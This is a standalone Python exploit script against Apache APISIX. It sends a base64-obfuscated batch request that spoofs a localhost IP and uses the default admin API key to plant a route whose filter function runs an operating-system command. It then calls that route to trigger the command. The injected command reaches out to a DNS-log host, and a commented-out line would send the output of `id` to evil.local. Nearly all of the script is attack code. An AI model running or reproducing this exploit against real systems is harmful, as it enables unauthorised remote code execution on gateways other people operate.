import requests
requests.packages.urllib3.disable_warnings(
            requests.packages.urllib3.exceptions.InsecureRequestWarning
        )
import base64, sys
def exploit(url):
	#cmd = 'curl http://evil.local/`id`'
	cmd = 'curl localhost.xxx.dnslog.cn'
	d = "eyJoZWFkZXJzIjp7IlgtUmVhbC1JUCI6IjEyNy4wLjAuMSIsIkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSwidGltZW91dCI6MTUwMCwicGlwZWxpbmUiOlt7Im1ldGhvZCI6IlBVVCIsInBhdGgiOiIvYXBpc2l4L2FkbWluL3JvdXRlcy9pbmRleD9hcGlfa2V5PWVkZDFjOWYwMzQzMzVmMTM2Zjg3YWQ4NGI2MjVjOGYxIiwiYm9keSI6IntcclxuIFwibmFtZVwiOiBcInRlc3RcIiwgXCJtZXRob2RcIjogW1wiR0VUXCJdLFxyXG4gXCJ1cmlcIjogXCIvYXBpL3Rlc3RcIixcclxuIFwidXBzdHJlYW1cIjp7XCJ0eXBlXCI6XCJyb3VuZHJvYmluXCIsXCJub2Rlc1wiOntcImh0dHBiaW4ub3JnOjgwXCI6MX19XHJcbixcclxuXCJmaWx0ZXJfZnVuY1wiOiBcImZ1bmN0aW9uKHZhcnMpIG9zLmV4ZWN1dGUoJ2Jsb29tYmxvb20nKTsgcmV0dXJuIHRydWUgZW5kXCJ9In1dfQ=="
	res_1 = requests.post(url + '/apisix/batch-requests', headers={'Content-Type': 'application/json'}, data=base64.b64decode(d).decode().replace('bloombloom', cmd), verify=False, timeout=5)
	print(res_1.text)
	res_2 = requests.get(url + "/api/test", verify=False, timeout=5, allow_redirects=False)
	print(res_2.status_code)

exploit(sys.argv[1])
